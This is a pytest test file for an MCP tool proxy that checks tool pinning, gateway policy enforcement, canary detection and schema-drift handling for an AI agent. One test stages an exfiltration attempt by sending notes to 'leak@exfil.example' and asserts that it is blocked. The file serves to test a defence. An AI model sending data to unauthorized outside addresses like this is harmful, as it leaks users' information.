"""T13 (R12): proxy coverage, bypass and unsupported restore capabilities are reported and enforced."""
import sys
from pathlib import Path

import pytest

from conftest import APP, PID, ROOT
from server.canonical import hash_value
from server.projects import InvalidRequest
from server.runtime.mcp_proxy import McpProxy
from server.schemas import TaskBody

SERVER = str(ROOT / "fixtures" / "mcp" / "notes_server.py")


def _schemas():
    sys.path.insert(0, str(ROOT / "fixtures" / "mcp"))
    import notes_server
    return {t["name"]: t["inputSchema"] for t in notes_server.TOOLS}


@pytest.fixture
def proxy(core, tmp_path, monkeypatch):
    sent = tmp_path / "sent.jsonl"
    s = _schemas()
    McpProxy.register_server(core, PID, "notes", [sys.executable, SERVER], {
        "search_notes": {"schema_hash": hash_value(s["search_notes"]), "effect_class": "read"},
        "send_message": {"schema_hash": hash_value(s["send_message"]), "effect_class": "external_send", "destination_arg": "to"},
    })
    p = McpProxy(core, PID)
    info = p.connect("notes", env={"NOTES_SERVER_SENT": str(sent)})
    core.projects.create_task_revision(PID, TaskBody(task_id="t_host", goal="Help with notes", tools=["mcp__notes__search_notes", "mcp__notes__send_message"],
                                                     recipient_ids=["finance_team"]), APP)
    agent = core.coordinator.create_agent(PID, "Host agent (proxy)", "mcp_proxy", {})
    p.start_run(agent["agent_id"], "t_host", mode="simulated")
    yield p, info, sent, agent
    p.close()


def test_pinned_tools_only_and_annotations_ignored(core, proxy):
    p, info, sent, agent = proxy
    assert info["exposed"] == ["mcp__notes__search_notes", "mcp__notes__send_message"]
    assert {"tool": "unpinned_tool", "reason": "not pinned by operator"} in info["dropped"]
    tool = core.projects.tool(PID, "mcp__notes__send_message")
    assert tool["effect_class"] == "external_send" and tool["meta"]["ignored_annotations"]["readOnlyHint"] is True
    init = p.handle({"jsonrpc": "2.0", "id": 7, "method": "initialize", "params": {}})
    assert init["id"] == 7 and "tools" in init["result"]["capabilities"] and "logging" not in init["result"]["capabilities"]
    lst = p.handle({"jsonrpc": "2.0", "id": "x1", "method": "tools/list"})
    assert lst["id"] == "x1" and [t["name"] for t in lst["result"]["tools"]] == info["exposed"]


def test_calls_go_through_gateway(core, proxy):
    p, info, sent, agent = proxy
    res = p.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "mcp__notes__search_notes", "arguments": {"query": "budget"}}})
    assert res["id"] == 1 and not res["result"]["isError"]
    meta = res["result"]["_meta"]["antibody"]
    assert meta["origin"] == "EXTERNAL_DATA" and core.sources.get(meta["source_id"])["channel"] == "tool_result"
    blocked = p.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                        "params": {"name": "mcp__notes__send_message", "arguments": {"to": "leak@exfil.example", "body": "notes"}}})
    assert blocked["result"]["isError"] and "DESTINATION_NOT_AUTHORIZED" in blocked["result"]["content"][0]["text"]
    assert not sent.exists()  # upstream never called
    ok = p.handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                   "params": {"name": "mcp__notes__send_message", "arguments": {"to": "finance@corp.example", "body": "weekly notes"}}})
    assert not ok["result"]["isError"]
    assert sent.read_text().count("finance@corp.example") == 1
    canary = p.handle({"jsonrpc": "2.0", "id": 4, "method": "tools/call",
                       "params": {"name": "mcp__notes__send_message", "arguments": {"to": "finance@corp.example", "body": "key CANARY-7F3A"}}})
    assert canary["result"]["isError"]
    unknown = p.handle({"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "unpinned_tool", "arguments": {}}})
    assert unknown["result"]["isError"]
    assert p.handle({"jsonrpc": "2.0", "id": 6, "method": "resources/list"})["error"]["code"] == -32601
    assert core.db.scalar("SELECT COUNT(*) FROM executor_invocations i JOIN decisions d ON d.decision_id=i.decision_id WHERE d.outcome!='ALLOW'") == 0


def test_capability_profile_and_unsupported_restore(core, proxy):
    p, info, sent, agent = proxy
    caps = {c["adapter"]: c for c in core.coordinator.capability_profiles()}
    assert caps["mcp_proxy"]["capabilities"]["restore_cursor"] is False and caps["mcp_proxy"]["capabilities"]["export_context"] is False
    assert "bypass" in caps["mcp_proxy"]["note"]
    assert all(caps["langgraph_reference"]["capabilities"].values())
    v = core.versions.branch(agent["accepted_branch_id"])["head_version"]
    with pytest.raises(InvalidRequest) as e:
        core.versions.fork(PID, v, "restore-proxy", "restore", "u")
    assert e.value.status == 422 and e.value.code == "CAPABILITY_UNSUPPORTED"
    with pytest.raises(InvalidRequest):
        core.coordinator.start_run(PID, agent["agent_id"], "t_host", wait=True)
    with pytest.raises(InvalidRequest):
        core.coordinator.create_agent(PID, "Cursor", "cursor_native", {})


def test_schema_change_drops_tool(core, tmp_path):
    McpProxy.register_server(core, PID, "notes2", [sys.executable, SERVER], {
        "search_notes": {"schema_hash": "sha256:old", "effect_class": "read"}})
    p = McpProxy(core, PID)
    info = p.connect("notes2", env={"NOTES_SERVER_SENT": str(tmp_path / "s.jsonl")})
    p.close()
    assert info["exposed"] == [] and {"tool": "search_notes", "reason": "schema hash changed since pinning"} in info["dropped"]
